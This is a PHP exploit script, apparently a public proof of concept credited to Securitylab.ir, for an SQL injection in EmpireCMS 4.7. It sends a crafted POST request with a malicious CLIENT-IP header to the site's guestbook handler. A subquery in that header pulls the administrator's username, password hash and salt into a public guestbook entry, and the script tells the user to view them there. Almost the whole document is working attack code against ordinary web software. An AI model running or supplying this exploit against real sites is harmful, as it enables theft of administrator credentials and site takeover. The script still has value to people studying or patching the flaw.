&lt;?php
print_r(&quot;
+------------------------------------------------------------------+
Application Info:
Name: EmpireCMS47
--------------------------------------------
Discoverd By: Securitylab.ir
Contacts: info@securitylab[dot]ir
Note: just work as php&gt;=5&amp;mysql&gt;=4.1
--------------------------------------------
Vulnerability Info:
Sql Injection
Medium Risk
+------------------------------------------------------------------+
&quot;);
if ($argc&lt;3) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path \n&quot;;
echo &quot;host: target server \n&quot;;
echo &quot;path: path to EmpireCMS47\n&quot;;
echo &quot;Example:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /\n&quot;;
die;
}
$host=$argv[1];
$path=$argv[2];
$data = &quot;name=11ttt&amp;email=111&amp;call=&amp;lytext=1111&amp;enews=AddGbook&quot;;
$cmd = &quot;aaaaaaaa&#039;,0,1,&#039;&#039;),(&#039;t00lsxxxx&#039;,&#039;t00lsxxxxx&#039;,&#039;&#039;,&#039;2008-05-28 15:44:17&#039;,(select concat(username,0x5f,password,0x5f,rnd) from phome_enewsuser where 
userid=1),&#039;&#039;,1,&#039;1111&#039;,0,0,&#039;&#039;)/*&quot;;
$message = &quot;POST &quot;.$path.&quot;/e/enews/index.php&quot;.&quot; HTTP/1.1\r\n&quot;;
$message .= &quot;Referer: http://&quot;.$host.$path.&quot;/e/tool/gbook/?bid=1\r\n&quot;;
$message .= &quot;Accept-Language: zh-cn\r\n&quot;;
$message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;
$message .= &quot;CLIENT-IP: $cmd\r\n&quot;;
$message .= &quot;Host: $host\r\n&quot;;
$message .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$message .= &quot;Cookie: ecmsgbookbid=1;\r\n&quot;;
$message .= &quot;Connection: Close\r\n&quot;;
$message .= &quot;\r\n&quot;;
$message .=$data;
$ock=fsockopen($host,80);
if (!$ock) {
echo &#039;No response from &#039;.$host;
die;
}
echo &quot;[+]connected to the site!\r\n&quot;;
echo &quot;[+]sending data now……\r\n&quot;;
fputs($ock,$message);
@$resp =&#039;&#039;;
while ($ock &amp;&amp; !feof($ock))
$resp .= fread($ock, 1024);
echo $resp;
echo &quot;[+]done!\r\n&quot;;
echo &quot;[+]go to http://$host$path/e/tool/gbook/?bid=1 see the hash&quot;
?&gt;